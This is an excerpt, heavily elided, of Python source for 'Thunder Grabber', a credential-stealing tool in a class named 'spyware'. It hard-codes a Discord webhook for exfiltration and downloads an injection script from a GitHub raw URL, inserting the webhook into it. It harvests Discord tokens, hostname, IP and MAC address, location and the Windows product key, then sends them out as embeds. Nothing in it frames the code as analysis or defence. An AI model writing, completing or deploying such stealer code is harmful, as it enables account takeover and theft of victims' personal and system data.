...
weblink = "https://discord.com/api/webhooks/987994593649909790/MVPL4xjooAM43xuaYwJsQt4R69L9LY81hDz73SjnOvXWSlJfWuPeeIwRDR_nEMcppQRS"
...
class spyware:
    ...
    def get_info(self):
        system_info = "THUNDER GRABBER MADE BY remind (tana)#0001"
        try:
                        ...
                        if os.path.exists(inj_path):
                            if self.startup not in argv[0]:
                                try:
                                    ...
                                    pass
                            f = httpx.get('https://raw.githubusercontent.com/glosifyed/ThunderInjection/main/injection').text.replace(
                                "%WEBHOOK%", weblink)
    ...
    def SendInfo(self):
        if self.tokens == None:
            ...
            for token in self.tokens:                     
                ...
                embed.set_author(name="⚡ Thunder Grabber ⚡", url='https://dsc.gg/boredd')
...
[Hostname] : {hostname}\n[IP Adresse] : {ip}\n[Mac Adresse] : {mac} \n[City] : {city}\n[Country] : {country}\n[Region] : {region}\n[Platform] : {wname}\n[Product Key] : {wkey if wkey else 'No Product Key'}```""")
                ...
                # set image
                #
                raw_url = "https://pastebin.com/raw/G8kSpXcP"
                ...
                # set footer
                embed.set_footer(text='Thunder Grabber Made By remind (tana)#0001')
        ...
        try:
            ...
            try:
                ...
                f2.write("Thunder Grabber Made By remind (tana)#0001\nNo Passwords Found")
                f2.close()
